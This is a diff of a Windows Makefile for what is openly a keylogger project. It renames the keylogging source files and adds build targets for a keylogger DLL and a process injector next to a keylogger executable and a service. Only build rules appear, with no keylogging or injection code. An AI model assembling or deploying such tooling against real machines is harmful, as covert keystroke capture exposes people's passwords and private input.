@@ -1,4 +1,4 @@
-SRCS = keylog/logs.c keylog/main.c keylog/getter.c
+SRCS = keylog/keylogger.c keylog/init_logger.c keylog/sys_getter.c
 FLAGS = /Wall /WX
 RC_FILE = res\version.rc
 RES_FILE = res\version.res
@@ -8,12 +8,19 @@ all: $(RES_FILE) winkey.exe svc.exe
 $(RES_FILE): $(RC_FILE)
 	rc /fo $(RES_FILE) $(RC_FILE)
 
-winkey.exe: $(SRCS)
+winkey.exe: $(SRCS) keylog\exemain.c
 	cl $(FLAGS) /Fe$@ $** $(RES_FILE) user32.lib psapi.lib
 
 svc.exe: service\svc.cpp
 	$(CC) $(FLAGS) /Fe$@ $**
 
+bonus: keylogger.dll injector.exe
+
+keylogger.dll: keylog/keylogger.c keylog/init_logger.c keylog/sys_getter.c keylog/dllmain.c
+	cl /LD $(FLAGS) keylog\keylogger.c keylog\init_logger.c keylog\sys_getter.c keylog\dllmain.c /link user32.lib /Fe:keylogger.dll
+
+injector.exe: keylog/injector.c $(RES_FILE)
+	cl $(FLAGS) keylog\injector.c $(RES_FILE) user32.lib psapi.lib /Fe:injector.exe
 clean:
 	del /Q *.obj 2>nul
 
@@ -21,5 +28,6 @@ fclean: clean
 	del /Q res\*.res 2>nul
 	del /Q *.exe 2>nul
 	del /Q logs.txt 2>nul
+	del /Q *.dll 2>nul
 
 re: fclean all
